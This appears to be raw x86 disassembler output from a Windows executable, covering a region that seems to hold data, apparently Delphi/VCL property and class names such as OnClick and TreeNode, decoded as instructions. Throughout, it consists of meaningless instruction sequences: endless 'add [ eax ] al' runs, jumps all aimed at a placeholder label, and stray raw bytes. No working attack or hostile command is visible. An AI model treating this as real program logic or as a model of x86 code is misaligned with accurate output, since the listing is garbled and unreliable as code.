add [ eax ] al
add [ ecx ] 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
str [ edx ]
inc esp
jb r-xdata
add [ eax ] al
adc eax [ eax ]
or [ esi + 0x75 ] al
insb
insb
inc esp
jb r-xdata
add [ eax ] eax
mov [ eax + eax + 0x74 ] al
add [ eax ] al
dec [ eax ]
sti
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0018 ] al
outsd
outsb
jae r-xdata
add [ bx + si ] dl
inc eax
add [ ecx ] ah
add al [ eax ]
call [ ebx + edi * 2 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ eax + 0x6f ] cl
je r-xdata
add [ eax ] al
inc ebx
jne r-xdata
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
push cs
push eax
popad
jb r-xdata
jb r-xdata
jpo r-xdata
jb r-xdata
popad
jb r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090026 ] al
outsd
outsb
je r-xdata
add [ edx ] bl
add [ 0x6c797453 ] al
imul ebp [ esi + 0x74 ] 0x432d4c73
add [ eax ] cl
add al [ eax ]
call [ eax + 0x100437b ]
add [ gs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
push 0x100437b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
add eax 0x6c797453
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080019 ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
add [ ecx ] al
outsb
jae r-xdata
sbb [ eax ] eax
or [ ebx + 0x65 ] dl
arpl [ ecx + ebp * 2 + 0x6f ] si
insd
popad
jae r-xdata
arpl [ ebx - 0x68 ] bp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] ch
add al [ eax ]
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060017 ] al
adc [ eax ] al
push eax
add [ eax ] al
inc eax
jb r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
jo r-xdata
add [ eax ] al
and eax 0x61500e00
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
inc [ edi + edx * 8 - 0x28b3ffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080022 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
adc al [ eax ]
or eax [ edx + esi * 2 + 0x61 ]
push edx
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
xchg [ eax + eax - 0x65 ] eax
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002c ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
push esp
mov eax [ eax + eax - 0x18 ]
add [ eax ] al
jo r-xdata
outsb
jne r-xdata
add [ eax ] al
sub [ eax ] 0x0
outsb
je r-xdata
pop ecx
add [ eax ] al
jmp [ eax - 0x29 ]
xor [ ebx ] al
sub al 0x2
add bh bh
add [ eax ] al
add [ eax + 0x4f09002f ] al
outsb
dec ebp
outsd
jne r-xdata
push 0xd0004489
push cs
dec edi
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
das
inc ebx
add [ eax + 0x2 ] dh
add bh bh
jo r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
adc [ eax ] al
push edi
add [ eax ] al
call [ ebp + edx * 8 + 0x44 ]
add [ eax + 0x44f6 ] dh
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or cl [ edi + 0x6e ]
js r-xdata
push 0x6948776f
outsb
je r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
test dl bh
inc ebx
add ah ah
cli
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0020 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push ebp
jo r-xdata
xor eax 0xfa5c0043
inc ebx
add [ edx + edi * 8 + 0x10043 ] ch
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al 0x0
or eax 0x72446e4f
popad
ja r-xdata
inc esp
outsd
ja r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
adc al 0x4f
outsb
inc ebx
jb r-xdata
add bh bh
add [ eax + 0x4f0b002d ] al
add [ eax ] al
dec edi
inc esp
dec edi
outsb
push eax
outsd
jo r-xdata
push eax
popad
jb r-xdata
mov [ ebp ] 0xff00007c
in al dx
aad 0x44
add [ ecx ] al
add [ eax + 0x4f10001f ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
outsb
inc esp
jb r-xdata
jpe r-xdata
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
mov [ eax + eax - 0x30 ] eax
push ebp
inc ecx
add al bh
add [ eax ] al
push edx
jae r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
adc al 0x36
inc ebx
add [ eax - 0x6 ] dh
inc ebx
add al cl
cli
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001d ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
loopne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or [ edi + 0x6e ] ecx
popad
je r-xdata
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
daa
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
nop
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0028 ] al
add [ eax + 0x1 ] al
outsb
je r-xdata
inc ebx
mov esp 0x448d
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
add [ eax ] al
jo r-xdata
jb r-xdata
inc esp
add al bl
add [ eax ] al
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x4 ] bp
mov eax [ eax + eax + 0x18 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
outsb
outsb
inc ebx
insb
popad
jae r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jbe r-xdata
mov eax [ eax + eax + 0x8 ]
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
sub [ ebx - 0x73abffbd ] bl
inc ecx
add [ ecx - 0x5f7fffbd ] ah
inc ebx
add [ edx ] cl
push esp
push esp
inc ebx
add [ eax + 0x415c ] bl
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001e ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
jb r-xdata
inc ebx
add [ eax + 0x43fa ] bl
sti
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0021 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
adc [ eax ] al
0xa8ff0000 0x44d7
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
je r-xdata
dec esi
outsd
jae r-xdata
dec esi
insb
jae r-xdata
sbb [ eax - 0x73abffbd ] cl
inc ecx
add [ esp + ecx * 4 + 0x41 ] bl
add [ eax - 0x68 ] dh
inc ebx
add [ ebp + edx * 4 + 0xe0043 ] bl
inc esp
outsd
arpl [ ebx - 0x4c ] bp
mov eax [ eax + eax + 0x10 ]
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0032 ] al
outsb
push ebx
je r-xdata
nop
push ebp
inc ecx
add [ eax + 0x2 ] ch
add bh bh
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push ebx
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
arpl [ ebx + 0x58 ] bp
das
inc ebx
add [ eax + 0x2 ] ah
add bh bh
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
outsb
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
outsd
jae r-xdata
sub [ edi ] bh
inc ebx
add [ edi ] al
or dl [ esp + edx * 2 + 0x72 ]
dec esi
insd
inc ebx
je r-xdata
aas
inc ebx
add [ eax + 0x415c ] bl
add [ eax ] cl
inc ebx
outsd
add [ edi + edi ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
aas
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
aas
inc ebx
add [ eax ] bl
add [ eax ] al
add [ esp + ebx * 2 ] ah
inc ecx
add [ eax ] al
xchg ebp eax
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] ch
jb r-xdata
cld
inc ebx
adc [ ebp + ecx * 2 + 0x75 ] edx
insb
insb
jae r-xdata
jae r-xdata
insb
jae r-xdata
or [ esp + edx * 2 + 0x72 ] edx
dec esi
outsd
mov al [ gs : 0x700433e ]
or [ esp + edx * 2 + 0x72 ] edx
dec esi
outsd
jo r-xdata
inc esp
jb r-xdata
outsd
push ebx
ja r-xdata
insb
jb r-xdata
inc eax
add [ edi + edi + 0x12030043 ] dl
push esp
dec ebp
jne r-xdata
push es
outsd
outsb
je r-xdata
add [ ebp + 0x3f500040 ] cl
inc ebx
add [ ebx ] al
or [ ebx + edx * 2 + 0x6f ] edx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or [ eax ] al
mov eax eax
jo r-xdata
jne r-xdata
je r-xdata
push 0x69676e61
outsb
inc ebp
jbe r-xdata
add [ gs : eax + 0x6000433f ] edx
inc eax
push 0x65676e61
pop es
jb r-xdata
jb r-xdata
aas
inc ebx
add [ esi ] al
arpl [ gs : ebx + edx * 2 + 0x74 ] si
jns r-xdata
insb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x40 ] ah
outsd
insb
push ebx
insb
arpl [ gs : ebp + ecx + 0x6d ] si
jae r-xdata
je r-xdata
push esp
jns r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
or al 0x31
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x2800433e ] dl
add [ eax ] al
add [ esp + ebx * 2 ] ah
inc ecx
add [ ebx + esi + 0x33b00040 ] ah
inc eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5fffbcc2 ] al
inc ebx
jb r-xdata
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ esi + edi + 0x10000043 ] bl
inc eax
add [ ebx + 0x4340d0c0 ] cl
outsb
pop es
inc ebx
add [ eax ] cl
adc [ esp + edx * 2 + 0x56 ] dl
inc ebx
jb r-xdata
outsb
je r-xdata
add [ eax ] cl
andps xmm2 [ esi + edx * 2 + 0x43 ]
push 0x65676e61
inc ebp
jbe r-xdata
mov eax eax
rol [ eax + 0x43 ] 0x1
push esi
imul esp [ ebp + 0x77 ] 0x6f727245
or [ ecx + 0x6c ] eax
outsb
je r-xdata
jb r-xdata
jae r-xdata
insb
push ebx
insb
arpl [ gs : ebx + edx * 2 + 0x74 ] si
jns r-xdata
inc ebx
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
inc eax
push 0x53746669
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
arpl [ gs : ebp + ecx + 0x6d ] si
jae r-xdata
imul esp [ esi + 0x74 ] 0x656c6553
arpl [ ebp + ecx + 0x6d ] si
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edi + edi + 0x43 ] cl
add [ esi ] al
jae r-xdata
or [ esi + ecx * 2 ] al
outsd
or [ gs : esp + edx * 2 + 0x72 ] edx
dec esi
outsd
add [ gs : ecx + edx ] ch
inc eax
add [ esi + edi + 0x41100043 ] bl
inc ebx
add [ eax ] cl
andps xmm2 [ esi + edx * 2 + 0x45 ]
imul esi [ fs : ecx + ebp * 2 + 0x6e ] 0x65764567
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec esi
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esp + edx * 2 + 0x72 ] edx
imul esi [ fs : edi + eax + 0x42 ] 0x656c6f6f
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ esi + edi + 0x10000043 ] bl
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
push esp
push esi
inc ebp
imul esi [ fs : ebp + 0x64 ] 0x6e657645
je r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ eax + 0x40 ] ah
jae r-xdata
add [ eax ] al
imul esi [ ebx + 0x69 ] 0x4f656c62
outsb
insb
jns r-xdata
dec esi
outsd
outsb
push es
jae r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esi + ecx * 2 ] al
outsd
or [ gs : esp + edx * 2 + 0x72 ] edx
dec esi
outsd
add [ gs : ebx ] ecx
inc ecx
insb
insb
outsd
ja r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec esi
rcr [ eax ] 0x42
inc ebx
imul ebp [ esi + 0x67 ] 0x40112c00
add [ esi + edi + 0x10ac0043 ] bl
inc eax
add [ ebp + 0x41b80040 ] cl
inc ebx
add [ eax ] cl
adc [ esp + edx * 2 + 0x56 ] edx
inc ebp
js r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0xf00433f ] dl
insd
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
nop
aas
inc ebx
add [ edi ] cl
insd
inc ebx
or [ ebx + 0x6f ] al
insd
jae r-xdata
bound ebp [ ecx + ebp * 2 + 0x6e ]
dec edi
inc esp
popad
je r-xdata
insb
outsd
ja r-xdata
or [ esi + ecx * 2 ] al
outsd
or [ gs : esp + edx * 2 + 0x72 ] edx
dec esi
outsd
add [ gs : ecx ] ecx
inc ecx
insb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec esi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
imul ebp [ esi + 0x67 ] 0x6e657645
je r-xdata
push ebx
outsb
jb r-xdata
popad
outsb
imul ebp [ fs : esi + 0x67 ] 0x6e657645
je r-xdata
dec esi
outsd
add [ gs : ecx ] eax
push ebx
push es
push ebx
je r-xdata
or [ esi + ecx * 2 ] al
outsd
or [ gs : esp + edx * 2 + 0x72 ] edx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec esi
add [ eax ] al
and [ eax + 0x40 ] dh
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
push cs
inc ebp
push esp
or al 0x0
imul esp [ edx + 0x6c ] 0x4f676e69
push es
jae r-xdata
inc ebx
add [ esi + edi + 0x10540043 ] bl
inc eax
jb r-xdata
add ecx [ eax ]
push es
or [ esi + ecx * 2 ] al
outsd
or [ gs : esp + edx * 2 + 0x72 ] edx
dec esi
outsd
add [ gs : 0x6f6c6c41 ] ecx
ja r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
insb
jns r-xdata
push esp
js r-xdata
je r-xdata
je r-xdata
inc ebx
add [ eax ] cl
adc dl [ esp + edx * 2 + 0x56 ]
inc ebx
jne r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
cmp al 0x43
inc ebp
jbe r-xdata
dec esi
arpl [ gs : eax + ecx + 0x4 ] si
outsd
insb
insb
popad
jo r-xdata
or [ esi + ecx * 2 ] al
outsd
or [ gs : esp + edx * 2 + 0x72 ] edx
dec esi
outsd
add [ gs : esi ] ecx
inc ecx
insb
insb
outsd
ja r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec esi
outsd
push es
jae r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
insd
inc esp
jb r-xdata
add [ eax + edx + 0x40 ] dl
add [ ebp + 0x433c0040 ] cl
outsb
je r-xdata
or [ esi ] al
push ebx
outsb
pop es
inc edx
outsd
outsd
insb
popad
arpl [ eax + ecx + 0x4 ] si
dec esi
push 0x65
js r-xdata
je r-xdata
inc edx
outsd
or [ esi + ecx * 2 ] al
push esp
inc ebx
inc esp
jb r-xdata
ja r-xdata
jb r-xdata
add eax 0x65530608
outsb
or [ 0x65646f4e ] al
xor [ ecx ] ecx
push esp
push esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x5 ] si
dec esi
outsd
xor [ gs : ecx ] ecx
or [ 0x65646f4e ] al
popad
outsb
inc ebp
jbe r-xdata
adc [ eax ] eax
pushfd
inc ebx
add [ eax ] al
adc [ eax ] al
mov eax eax
js r-xdata
popad
outsb
jae r-xdata
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
outsd
ja r-xdata
je r-xdata
add al cl
inc edi
inc ebx
add [ esi + edi + 0x2a240043 ] bl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x43a00040 ] cl
inc ebx
add [ eax ] cl
jbe r-xdata
add [ ebx ] al
or [ esi ] al
xor cl [ ecx ]
push esp
push esp
jb r-xdata
dec esi
insd
push esp
jb r-xdata
dec esi
outsd
add [ gs : esp + eax * 2 ] al
popad
je r-xdata
outsd
or [ gs : 0x65646f4e ] al
outsb
je r-xdata
outsd
insd
jo r-xdata
mov esp 0x8004342
andps xmm2 [ esi + edx * 2 + 0x43 ]
add [ eax ] cl
adc [ esp + edx * 2 + 0x56 ] dl
inc ebp
js r-xdata
inc ebx
outsb
add [ ecx + edx ] ch
inc eax
add [ esi + edi + 0x10000043 ] bl
inc eax
add [ ebx + 0x434278c0 ] cl
add [ eax ] cl
adc dl [ esp + edx * 2 + 0x56 ]
inc ebx
outsd
insb
insb
popad
jo r-xdata
outsd
outsb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ esi + edi + 0x10000043 ] bl
inc eax
add [ ebx + 0x434218c0 ] cl
push es
adc [ gs : si + 0x43 ] dl
jne r-xdata
push esi
imul esp [ ebp + 0x77 ] 0x52410512
arpl [ gs : ebp + eax + 0x54 ] si
ja r-xdata
inc esp
popa
jne r-xdata
jbe r-xdata
jb r-xdata
insd
outsd
outsd
insb
popad
outsb
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
add [ gs : ebx ] ecx
je r-xdata
add [ eax ] al
adc [ eax ] al
and al 0x44
je r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
adc al [ 0x63655241 ]
push esp
inc ebx
jne r-xdata
push esp
jb r-xdata
push esi
imul esp [ ebp + 0x77 ] 0x52410512
arpl [ gs : ebp + eax + 0x54 ] si
ja r-xdata
pop es
dec ecx
outsb
je r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esi + ecx * 2 ] al
push esp
inc ebx
jne r-xdata
je r-xdata
jb r-xdata
je r-xdata
outsd
add [ gs : 0x74617453 ] al
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
je r-xdata
inc ebx
add [ eax ] cl
push ds
inc eax
add [ ebp + 0x44ac0040 ] cl
outsb
je r-xdata
add [ eax ] al
inc esp
sub [ ebx ] eax
add [ eax ] dl
jne r-xdata
or [ gs : esp + edx * 2 + 0x72 ] edx
dec esi
push esi
imul esp [ ebp + 0x77 ] 0x6f4e0408
push esp
inc ebx
jne r-xdata
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
push esp
push esp
push esi
inc ecx
jbe r-xdata
add [ esp + eax * 2 + 0x1e080043 ] ch
je r-xdata
adc [ ebx + eax * 2 + 0x75 ] dl
je r-xdata
inc ebx
add [ edx + ebp ] ah
insd
inc ebx
add [ eax ] cl
sbb dl [ esp + edx * 2 + 0x56 ]
inc ecx
jbe r-xdata
sub al [ ebx ]
add [ eax ] dl
inc eax
add [ esp + eax * 2 ] ah
insd
outsb
push ebx
outsb
jb r-xdata
add ecx [ eax ]
push es
inc esp
popa
add [ ebx ] ecx
push edx
arpl [ gs : ecx + eax + 0xb ] si
push esp
je r-xdata
inc ebx
jne r-xdata
je r-xdata
jne r-xdata
je r-xdata
add eax 0x63655241
add eax 0x63655254
je r-xdata
jb r-xdata
outsd
or [ gs : esp + edx * 2 + 0x72 ] edx
dec esi
outsd
add [ gs : ecx + edx ] ch
inc eax
add [ esi + edi + 0x408d0043 ] bl
add [ edx + eax * 2 + 0xf080043 ] bh
push esp
push esp
push esi
inc ebx
or [ esi + ecx * 2 ] al
push esp
dec edi
popad
outsd
insd
inc esp
jb r-xdata
popad
je r-xdata
ja r-xdata
insd
inc esp
jb r-xdata
adc al [ 0x63655241 ]
push esp
inc ebx
jne r-xdata
ja r-xdata
je r-xdata
jb r-xdata
add al 0x8
push es
push ebx
outsb
je r-xdata
popad
jae r-xdata
je r-xdata
lea eax [ eax ]
lodsb [ esi ]
inc esp
insd
inc esp
outsd
dec esi
outsd
jb r-xdata
jb r-xdata
ja r-xdata
add eax 0x63655254
je r-xdata
je r-xdata
jne r-xdata
jb r-xdata
or eax [ ebp + 0x66 ]
popad
inc ebx
outsd
insd
jo r-xdata
pop es
add [ eax ] al
add [ eax ] al
inc edi
dec esi
outsd
inc ebx
insb
lea eax [ eax ]
jo r-xdata
ja r-xdata
inc ebx
add [ eax + 0x34004347 ] bh
add eax [ eax ]
add al dl
xchg edi eax
inc esp
add [ eax ] bh
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ah
inc edi
je r-xdata
popad
outsb
insb
popad
insd
jb r-xdata
add al 0x4e
jae r-xdata
ja r-xdata
jae r-xdata
add [ 0x67617453 ] al
push esp
ja r-xdata
je r-xdata
adc [ gs : ebx + eax * 2 + 0x75 ] dl
je r-xdata
add eax 0x63655241
arpl [ ebp + eax + 0x54 ] si
inc esp
popa
jne r-xdata
add [ ebx ] ecx
dec esi
or [ esp + edx * 2 + 0x72 ] edx
ja r-xdata
add [ ecx ] ecx
dec esi
outsd
push esp
inc ebx
jne r-xdata
or [ esi ] al
insd
inc esp
jb r-xdata
add [ ebx ] ecx
inc esp
popa
jne r-xdata
inc edx
outsd
outsd
insb
popad
outsb
dec ecx
insd
inc esp
ja r-xdata
jb r-xdata
outsd
add al 0x4e
add eax 0x67617453
insd
inc esp
jb r-xdata
push ebx
je r-xdata
ja r-xdata
jb r-xdata
inc eax
add [ eax - 0x73ffbfcd ] dh
or al [ edx ]
mov eax 0x94004033
sbb [ ebp ] eax
or al 0x31
inc ebp
dec esi
outsd
inc ebx
insb
popad
jae r-xdata
inc ebx
add [ eax ] cl
pop ss
push esp
inc esp
sub [ ebx ] eax
add [ eax ] dl
inc eax
add [ eax ] al
adc [ eax ] al
je r-xdata
popad
or [ gs : esp + edx * 2 + 0x72 ] edx
push esi
imul esp [ ebp + 0x77 ] 0x6f4e0408
inc ebx
add [ ecx + ebp + 0x43 ] al
add [ eax ] al
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x45700040 ] cl
inc ebx
add [ edx + ebp ] ah
dec esi
add al cl
inc edi
inc ebx
add [ esi + edi + 0x2a240043 ] bl
outsd
or [ esi ] al
push ebx
outsb
jb r-xdata
je r-xdata
add [ gs : 0x67617453 ] al
je r-xdata
jb r-xdata
insd
push esp
jb r-xdata
add al cl
inc edi
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx + ebp + 0x43 ] al
add [ eax ] al
adc [ eax ] al
inc edx
mov al 0x43
add [ edx + eax * 8 ] ch
inc ebx
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
push cs
add [ eax ] ch
xor [ eax ] eax
int3
je r-xdata
popad
jae r-xdata
ja r-xdata
push esp
push esp
jb r-xdata
je r-xdata
popad
inc edx
outsd
outsd
insb
popad
outsb
push ebx
outsb
jb r-xdata
or [ esi ] al
outsd
add [ gs : 0x74617453 ] al
adc [ gs : ebx + eax * 2 + 0x75 ] dl
dec esi
je r-xdata
push ss
push esp
push esp
push esi
inc ebx
jne r-xdata
add al cl
inc edi
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
mov al [ 0x8004343 ]
inc edx
outsd
outsd
insb
popad
outsb
pop es
dec ecx
outsb
je r-xdata
xor al 0x3
add [ eax ] al
rcl [ edi + 0x11380044 ] 0x1
inc edx
outsb
je r-xdata
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ esp ] dl
inc ebx
add [ eax + 0x44 ] cl
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
lodsb [ esi ]
mov esp 0xc8c40043
inc esp
add al al
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ eax - 0x6fffbc52 ] dh
aad 0x44
add [ eax ] cl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
add ah cl
mov esp 0xf9700043
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add [ esi + 0x43 ] bh
add [ edi + ecx - 0x585fffbb ] ah
inc ebx
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
shr [ ecx + 0x3e300043 ] 0x1
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ ecx + eax * 8 + 0x43 ] bl
add [ eax - 0x1fffbc3f ] bl
mov [ ebx ] 0x38
mov [ ebx ] sub_43beec
or al 0xbf
inc ebx
add [ esi + eax * 8 + 0x43 ] cl
add [ eax - 0x37ffbc35 ] ch
iretd
push eax
adc [ edx ] eax
cmp [ esi ] cl
add al cl
inc edi
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx + 0x434614c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 2 ] dl
inc ebx
add ah cl
inc edi
